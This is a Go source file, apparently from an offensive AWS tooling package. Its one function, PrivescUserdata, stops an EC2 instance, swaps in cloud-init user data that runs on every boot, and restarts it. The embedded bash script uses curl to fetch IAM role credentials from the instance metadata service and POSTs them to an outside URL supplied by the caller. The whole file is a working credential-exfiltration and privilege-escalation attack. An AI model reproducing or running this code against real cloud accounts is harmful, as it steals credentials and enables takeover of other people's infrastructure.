package awsdata

import (
	"fmt"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
)

func PrivescUserdata(sess *session.Session, instanceID string, payload string) {

	StopInstance(sess, instanceID)
	fmt.Println("Waiting for instance to stop...")
	time.Sleep(30 * time.Second)

	//userdata payload to extract metadata
	userData := fmt.Sprintf(`Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials)
META=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
curl -X POST -d "$META" %s
--//`, payload)

	//dataEnc := base64.StdEncoding.EncodeToString([]byte(userData))

	input := &ec2.ModifyInstanceAttributeInput{
		InstanceId: aws.String(instanceID),
		UserData: &ec2.BlobAttributeValue{
			Value: []byte(userData),
		},
	}
	ModifyInstanceAttribute(sess, input)
	StartInstance(sess, instanceID)
}
